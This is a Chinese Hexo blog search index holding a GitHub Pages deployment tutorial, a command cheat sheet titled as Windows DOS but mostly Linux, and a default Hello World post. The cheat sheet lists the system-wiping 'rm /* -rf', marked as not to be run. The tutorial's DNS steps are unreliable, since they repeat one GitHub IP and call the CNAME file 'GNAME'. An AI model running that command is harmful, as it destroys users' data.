class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install --save hexo-deployer-git</span><br></pre></td></tr></table></figure><h3 id="配置-config-yml"><a href="#配置-config-yml" class="headerlink" title="配置　_config.yml"></a>配置　_config.yml</h3><p>blog目录下找到_config.yml记事本打开，在最下面找到　# Deployment</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:YourGithubName/YourGithubName.github.io.git　#这个链接是你自己YourGithubName.github.io仓库的的SSH的链接</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><p>按照上面的格式填写，把YourGithubName改成自己注册的名字，也可以在GitHub复制这个仓库的SSH的链接</p><h2 id="Windows-环境配置Github-的SSH-key"><a href="#Windows-环境配置Github-的SSH-key" class="headerlink" title="Windows 环境配置Github 的SSH key"></a>Windows 环境配置Github 的SSH key</h2><p><b><font size=3>以下命令行内容用Git Bash运行</font></b></p><h3 id="先设置GitHub的user-name和email"><a href="#先设置GitHub的user-name和email" class="headerlink" title="先设置GitHub的user name和email"></a>先设置GitHub的user name和email</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;Git账号&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email &quot;Git邮箱&quot;</span><br></pre></td></tr></table></figure><h3 id="使用Git-Bash，生成一个新的SSH密钥"><a href="#使用Git-Bash，生成一个新的SSH密钥" class="headerlink" title="使用Git Bash，生成一个新的SSH密钥"></a>使用Git Bash，生成一个新的SSH密钥</h3><p>打开 Git Bash，输入如下命令，然后连续按三个回车即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;your_email@example.com&quot;</span><br></pre></td></tr></table></figure><h3 id="使用GitBash-将SSH私钥添加到-ssh-agent"><a href="#使用GitBash-将SSH私钥添加到-ssh-agent" class="headerlink" title="使用GitBash 将SSH私钥添加到 ssh-agent"></a>使用GitBash 将SSH私钥添加到 ssh-agent</h3><p>打开 Git Bash，在控制台输入如下指令，实现后台启动 ssh-agent</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval $(ssh-agent -s)</span><br></pre></td></tr></table></figure><p>将SSH私钥添加到 ssh-agent</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-add /c/Users/Administrator/.ssh/id_rsa</span><br></pre></td></tr></table></figure><h3 id="将SSH公钥添加到GitHub账户"><a href="#将SSH公钥添加到GitHub账户" class="headerlink" title="将SSH公钥添加到GitHub账户"></a>将SSH公钥添加到GitHub账户</h3><p>1.打开 Git Bash，在控制台输入如下指令,复制SSH公钥的完整内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clip &lt; /c/Users/Administrator/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure><p>2、进入GitHub的设置页面（登录GitHub，在右上角）<br>3、点击左部侧边栏的 SSH keys 选项<br>4、点击 NEW SSH key 按钮<br>5、在Title输入框内，为你的新key取个名字，在Key输入框内，粘贴前面复制好的公钥内容，然后点击 Add key 按钮即可。</p><h3 id="测试连接"><a href="#测试连接" class="headerlink" title="测试连接"></a>测试连接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><h2 id="windows10环境下要在在-hexo-d-之前敲"><a href="#windows10环境下要在在-hexo-d-之前敲" class="headerlink" title="windows10环境下要在在 hexo d 之前敲"></a>windows10环境下要在在 hexo d 之前敲</h2><p>打开 Git Bash，在控制台输入如下指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email &quot;you@example.com&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;YourName&quot;</span><br></pre></td></tr></table></figure><p>把<a href="mailto:&#121;&#111;&#x75;&#64;&#101;&#x78;&#x61;&#109;&#112;&#108;&#101;&#x2e;&#x63;&#x6f;&#x6d;">&#121;&#111;&#x75;&#64;&#101;&#x78;&#x61;&#109;&#112;&#108;&#101;&#x2e;&#x63;&#x6f;&#x6d;</a>；YourName改成自己的</p><h2 id="部署到Github仓库里"><a href="#部署到Github仓库里" class="headerlink" title="部署到Github仓库里"></a>部署到Github仓库里</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><h3 id="安装Butterfly主题"><a href="#安装Butterfly主题" class="headerlink" title="安装Butterfly主题"></a>安装Butterfly主题</h3><p>在你的blog目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><h3 id="修改hexo根目录下的-config-yml-文件"><a href="#修改hexo根目录下的-config-yml-文件" class="headerlink" title="修改hexo根目录下的 _config.yml 文件"></a>修改hexo根目录下的 _config.yml 文件</h3><p>theme: butterfly</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Extensions</span><br><span class="line">## Plugins: https://hexo.io/plugins/</span><br><span class="line">## Themes: https://hexo.io/themes/</span><br><span class="line">theme: butterfly</span><br></pre></td></tr></table></figure><h3 id="安裝butterfly的插件"><a href="#安裝butterfly的插件" class="headerlink" title="安裝butterfly的插件"></a>安裝butterfly的插件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><h3 id="配置主题"><a href="#配置主题" class="headerlink" title="配置主题"></a>配置主题</h3><p>butterfly主题的官网，里面有配置文档，按照需求跟着配置即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://butterfly.js.org/</span><br></pre></td></tr></table></figure><h3 id="访问这个地址可以查看博客"><a href="#访问这个地址可以查看博客" class="headerlink" title="访问这个地址可以查看博客"></a>访问这个地址可以查看博客</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://YourGithubName.github.io/</span><br></pre></td></tr></table></figure><h2 id="github的短域名用自己的域名解析"><a href="#github的短域名用自己的域名解析" class="headerlink" title="github的短域名用自己的域名解析"></a>github的短域名用自己的域名解析</h2><h3 id="DNS修改"><a href="#DNS修改" class="headerlink" title="DNS修改"></a>DNS修改</h3><p>你购买域名的管理后台中，打开域名控制台-&gt;基本管理-&gt;DNS修改</p><h3 id="域名添加-DNS-解析"><a href="#域名添加-DNS-解析" class="headerlink" title="域名添加 DNS 解析"></a>域名添加 DNS 解析</h3><p>github官网提供的两个主机ip地址：192.30.252.153 和 192.30.252.153， 将这两个作为主机地址，给域名的DNS解析添加两个 A记录，然后再添加一个 GNAME记录 主机地址填的是我们原本用来访问github博客的地址： githubname.github.io</p><h3 id="创建-GNAME-文件"><a href="#创建-GNAME-文件" class="headerlink" title="创建 GNAME 文件"></a>创建 GNAME 文件</h3><p>在hexo本地目录 source 目录下面新建一个文件，取名为 GNAME (无后缀)，内容就是自己买的域名，以我的为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putdown.top</span><br></pre></td></tr></table></figure><h3 id="域名绑定"><a href="#域名绑定" class="headerlink" title="域名绑定"></a>域名绑定</h3><p>打开博客在Github中的地址，然后切换到 Settings页，设置Custom domain内容为我们自己的域名值（例如：我的域名是putdown.top），点击Save按钮保存</p><h3 id="博客有修改要使用命令重新启动，常用组合命令如下"><a href="#博客有修改要使用命令重新启动，常用组合命令如下" class="headerlink" title="博客有修改要使用命令重新启动，常用组合命令如下"></a>博客有修改要使用命令重新启动，常用组合命令如下</h3><p>清理 生产 启动本地服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure><p>清理 生产 上传github</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在windows中常用的DOS命令</title>
      <link href="/archives/adde0752.html"/>
      <url>/archives/adde0752.html</url>
      
        <content type="html"><![CDATA[<h1 id="在windows中常用的DOS命令"><a href="#在windows中常用的DOS命令" class="headerlink" title="在windows中常用的DOS命令"></a>在windows中常用的DOS命令</h1><h2 id="常用文件管理命令"><a href="#常用文件管理命令" class="headerlink" title="常用文件管理命令"></a>常用文件管理命令</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">ls 列出当前目录下所有文件</span><br><span class="line">ls                               # 列出当前目录下所有文件，蓝色的是文件夹，白色的是普通文件，绿色的是可执行文件</span><br><span class="line">ls -a                            # 显示隐藏文件</span><br><span class="line">ls -l                            # 显示文件权限</span><br><span class="line">ls -lh                           # 以人类易懂的单位显示大小</span><br><span class="line">ls *.txt -l                      # 将所有 txt 文件显示出来  </span><br><span class="line"></span><br><span class="line">pwd                             # 显示当前路径</span><br><span class="line">pwd -P                          # 显示出确实的路径，而非使用连结 (link) 路径。(注意是大写的 P <span class="variable">!!!</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> XXX                          # 进入XXX目录下          </span><br><span class="line"><span class="built_in">cd</span> ..                           # 返回上层目录</span><br><span class="line"><span class="built_in">cd</span>                              # 不管到哪进行 <span class="built_in">cd</span> ，都回到 用户主目录 目录下      ~目录</span><br><span class="line"><span class="built_in">cd</span> -                            # 回溯，返回上一个目录</span><br><span class="line"></span><br><span class="line">cp XXX YYY                      # 将XXX文件复制成YYY，XXX和YYY可以是一个路径，比如../dir_c/a.txt，表示上层目录                                  下的dir_c文件夹下的文件a.txt</span><br><span class="line">cp a/tmp.txt b/tmp2.txt         # 复制 + 粘贴 + 重命名</span><br><span class="line">cp a b -r                       # 目录：复制整个目录（前提是 b 文件夹存在）</span><br><span class="line">cp a c -r                       # 文件：将 a 文件复制一份到 当前文件 ，并命名为 c（前提是 c 文件夹不存在）</span><br><span class="line">cp -i /root/install.sh /home    # 加上-i参数，增加覆盖询问</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> XXX                       # 创建目录 XXX</span><br><span class="line"><span class="built_in">mkdir</span> a/b/c -p                  # 递归创建文件夹</span><br><span class="line"><span class="built_in">mkdir</span> a b c                     # 同时创建多个文件夹</span><br><span class="line"><span class="built_in">mkdir</span> -m <span class="number">711</span> test               # 配置文件的权限：创建权限为 rwx--x--x 的目录 test </span><br><span class="line"></span><br><span class="line"><span class="built_in">rmdir</span> XXX                       # 删除空的目录，目录不为空无法删除！而 rm 能删除非空目录。</span><br><span class="line"><span class="built_in">rmdir</span> -p test1/test2/test3      # 连同上一级『空的』目录也一起删除！删除到最近不是空目录的目录！</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rm XXX                          # 删除普通文件        rm 删除是无法返回的！</span><br><span class="line">rm XXX -r                       # 删除文件夹</span><br><span class="line">rm tmp1.txt tmp2.txt            # 同时删除多个文件</span><br><span class="line">rm *.txt                        # 删除 txt 文件，支持正则表达式</span><br><span class="line">rm a/*                          # 删除 a 文件夹下所有的东西</span><br><span class="line">rm /* -rf                       # 删库        -f 是强行删除    -r 是递归删除        不要执行该语句！</span><br><span class="line">rm -i install.sh                # 互动模式，在删除前会询问使用者是否动作 </span><br><span class="line"></span><br><span class="line">mv XXX YYY                      # 将XXX文件移动到YYY，和cp命令一样，XXX和YYY可以是一个路径；重命名也是用这个命令</span><br><span class="line">mv a/tmp.txt b/tmp1.txt         # 移动，剪切功能，当然也可以改名（cp是复制功能）</span><br><span class="line">mv a s                          # 将文件夹改名，原来的文件夹没了</span><br><span class="line">mv XXX YYY                      # -i ：若目标文件已经存在时，就会询问是否覆盖。如果不加，是默认覆盖的！</span><br><span class="line"></span><br><span class="line">touch XXX                       # 创建一个文件</span><br><span class="line"></span><br><span class="line">cat XXX                         # 展示文件 XXX 中的内容</span><br><span class="line"></span><br><span class="line"><span class="built_in">tree</span>                            # 目录以树状显示出来</span><br><span class="line"></span><br><span class="line">man [命令]                      # 查看各个命令的使用文档</span><br></pre></td></tr></table></figure><h2 id="与其他系统账号聊天"><a href="#与其他系统账号聊天" class="headerlink" title="与其他系统账号聊天"></a>与其他系统账号聊天</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Msg user “hello” </span><br></pre></td></tr></table></figure><h2 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo  </span><br></pre></td></tr></table></figure><h2 id="ipconfig"><a href="#ipconfig" class="headerlink" title="ipconfig"></a>ipconfig</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ipconfig</span>                         #显示每个已经配置了的接口的IP地址、子网掩码和缺省网关值</span><br><span class="line"><span class="built_in">ipconfig</span>/all                     #显示计算机网络连接情况，包括它的IP地址、DNS、DHCP、MAC地址等信息</span><br></pre></td></tr></table></figure><h2 id="针对进行DHCP服务器重新获取IP"><a href="#针对进行DHCP服务器重新获取IP" class="headerlink" title="针对进行DHCP服务器重新获取IP"></a>针对进行DHCP服务器重新获取IP</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ipconfig</span> /release                #释放ip</span><br><span class="line"><span class="built_in">ipconfig</span> /renew                  #重新获得ip</span><br></pre></td></tr></table></figure><h2 id="检测网络的连通情况和分析网络速度"><a href="#检测网络的连通情况和分析网络速度" class="headerlink" title="检测网络的连通情况和分析网络速度"></a>检测网络的连通情况和分析网络速度</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ping</span> IP</span><br><span class="line"><span class="built_in">ping</span> 域名</span><br><span class="line"><span class="built_in">ping</span> 主机名</span><br></pre></td></tr></table></figure><h2 id="arp-地址转换协议"><a href="#arp-地址转换协议" class="headerlink" title="arp 地址转换协议"></a>arp 地址转换协议</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arp –a                          #用于查看高速缓存中的所有项目</span><br><span class="line">arp -s IP                       #向ARP高速缓存中人工输入一个静态项目</span><br><span class="line">arp -a IP                       #如果有多个网卡，只显示与该接口相关的ARP缓存项目</span><br><span class="line">arp -d IP                       #使用本命令能够人工删除一个静态项目。</span><br></pre></td></tr></table></figure><h2 id="traceroute"><a href="#traceroute" class="headerlink" title="traceroute"></a>traceroute</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tracert IP                      #用来查看网络在连接站点时经过的步骤或采取哪种路线</span><br></pre></td></tr></table></figure><h2 id="route"><a href="#route" class="headerlink" title="route"></a>route</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">route <span class="built_in">print</span>                     #显示路由表中的当前项目</span><br><span class="line">route add                       #将路由项目添加进路由表</span><br><span class="line">route change                    #使用此命令来修改数据的传输路由</span><br><span class="line">route delete                    #从路由表中删除路由</span><br></pre></td></tr></table></figure><h2 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup  查看本机的IP及域名服务器地址</span><br><span class="line">&gt;         输入域名/IP查看对应的IP地址或域名并回车即可</span><br></pre></td></tr></table></figure><h2 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat –a                    #显示所有的有效连接信息列表</span><br><span class="line">netstat –n                    #以点分十进制的形式列出IP地址</span><br><span class="line">netstat -e                    #用于显示关于以太网的统计数据</span><br></pre></td></tr></table></figure><h2 id="net"><a href="#net" class="headerlink" title="net"></a>net</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> <span class="built_in">help</span> command              #在命令行获得<span class="built_in">net</span>命令的语法帮助</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">start</span>                     #查看开启了哪些服务</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">start</span> 服务名               #开启服务</span><br><span class="line"><span class="built_in">net</span> stop 服务名                #停止某服务</span><br><span class="line"><span class="built_in">net</span> user 用户名 密码 /add      #建立用户</span><br><span class="line"><span class="built_in">net</span> user guest /active:yes    #激活guest用户</span><br><span class="line"><span class="built_in">net</span> user                      #查看有哪些用户 </span><br><span class="line"><span class="built_in">net</span> user                      #帐户名 查看帐户的属性 </span><br><span class="line"><span class="built_in">net</span> user guest <span class="number">12345</span>          #用guest用户登陆后用将密码改为<span class="number">12345</span> </span><br><span class="line"><span class="built_in">net</span> password 密码             #更改系统登陆密码 </span><br><span class="line"><span class="built_in">net</span> share                     #查看本地开启的共享</span><br><span class="line"><span class="built_in">net</span> view                      #查看局域网内其他计算机名称</span><br></pre></td></tr></table></figure><h2 id="启动工具"><a href="#启动工具" class="headerlink" title="启动工具"></a>启动工具</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&#x27;win+r&#x27;键输入以下命令</span><br><span class="line">calc                                       #启动计算器</span><br><span class="line">charmap                                    #启动字符映射表</span><br><span class="line">cleanmgr                                   #打开磁盘清理工具</span><br><span class="line"><span class="built_in">cmd</span>.exe                                    #查看<span class="built_in">cmd</span>版本</span><br><span class="line"><span class="built_in">chkdsk</span>.exe                                 #盘检查</span><br><span class="line">certmgr.msc                                #证书管理实用程序</span><br><span class="line">dvdplayDVD                                 #播放器</span><br><span class="line">diskmgmt.msc                               #磁盘管理</span><br><span class="line">devmgmt.msc                                #设备管理器</span><br><span class="line">dxdiag                                     #查DirexctX信息，即查看电脑信息</span><br><span class="line">dcomcnfg                                   #打开系统组件服务</span><br><span class="line">explorer                                   #打开文件管理</span><br><span class="line">eventvwr                                   #事件查看器</span><br><span class="line">eudcedit                                   #造字程序</span><br><span class="line">fsmgmt.msc                                 #共享文件夹管理器</span><br><span class="line">lusrmgr.msc                                #本机用户和组</span><br><span class="line">msconfig.exe                               #系统配置程序</span><br><span class="line">mspaint                                    #画图板</span><br><span class="line">magnify                                    #放大镜，即win键+加号键</span><br><span class="line">mmc                                        #打开控制台</span><br><span class="line">mobsync                                    #打开同步命令</span><br><span class="line">notepad                                    #打开记事本</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">start</span> messenger                        #开始信使服务</span><br><span class="line"><span class="built_in">net</span> stop messenger                         #停止信使服务</span><br><span class="line">nslookup                                   #网络管理的工具向导、ip地址侦查器，即本机ip地址查询</span><br><span class="line">nattator                                   #屏幕讲述人</span><br><span class="line">netstat -an-(TC)                           #命令检查接口</span><br><span class="line">osk                                        #打开屏幕键盘</span><br><span class="line">odbcad32ODBC                               #数据源管理器</span><br><span class="line">perfmon.msc                                #计算机性能检测程序</span><br><span class="line">regsvr32/u .dll                            #停止dll文件运行（输入需要停止的dll文件名称）</span><br><span class="line">regedt32（regedit.exe）                    #注册表编辑器</span><br><span class="line">services.msc                               #本地服务设置</span><br><span class="line">sigverif                                   #文件签名验证程序</span><br><span class="line">shrpubw                                    #创建共享文件夹</span><br><span class="line">sfc.exe                                    #系统文件检查器</span><br><span class="line">sfc/scannowwindows                         #文件保护（扫描错误并复原）</span><br><span class="line">utilman                                    #打开辅助设置</span><br><span class="line">wmimgmt.msc                                #打开Windows管理体系结构（WMI）</span><br><span class="line">wscript.exe                                #Windows脚本宿主设置</span><br><span class="line">write                                      #写字板</span><br><span class="line">wiaacmgr                                   #扫描仪和照相机向导</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/archives/4a17b156.html"/>
      <url>/archives/4a17b156.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
